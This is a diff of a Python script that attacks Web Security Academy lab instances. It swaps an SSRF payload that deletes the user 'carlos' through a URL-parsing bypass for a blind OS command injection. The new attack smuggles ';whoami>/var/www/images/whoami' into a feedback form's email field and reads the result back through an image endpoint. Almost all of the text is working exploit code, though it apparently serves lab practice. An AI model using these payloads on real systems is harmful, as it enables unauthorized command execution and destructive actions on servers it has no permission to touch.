@@ -5,21 +5,47 @@ import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 from bs4 import BeautifulSoup
 
-url = 'https://0a9d00030370c23b83e866f5002900e0.web-security-academy.net'
+url = 'https://0aa600da03273e0b8096b7b000ff0037.web-security-academy.net'
 
-session = requests.Session()
+# session = requests.Session()
 
-headers = {
-    'Host': '0a9d00030370c23b83e866f5002900e0.web-security-academy.net',
-    'Content-Type': 'application/x-www-form-urlencoded',
+res = requests.get(
+    url + '/feedback',
+    verify=False,
+)
+
+soup = BeautifulSoup(res.text, 'html.parser')
+session = res.cookies.get('session')
+csrf_token = soup.find('input', {'name': 'csrf'})['value']
+print("session: ", session)
+print("csrf: ", csrf_token)
+
+cookies = {
+    'session': session,
 }
 
-data_url = 'stockApi=http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos'
+data = {
+    'csrf': csrf_token,
+    'name': 'cuong',
+    'email': 'abc%40gmail.com;whoami>/var/www/images/whoami${IFS}||${IFS}',
+    'subject': 'abc',
+    'message': 'abc',
+}
 
 response = requests.post(
-    url + '/product/stock',
-    headers=headers,
-    data=data_url,
+    url + '/feedback/submit',
+    cookies=cookies,
+    data=data,
+    verify=False,
+)
+
+params = {
+    'filename': 'whoami'
+}
+
+response = requests.get(
+    url + '/image',
+    params=params,
     verify=False,
 )
 
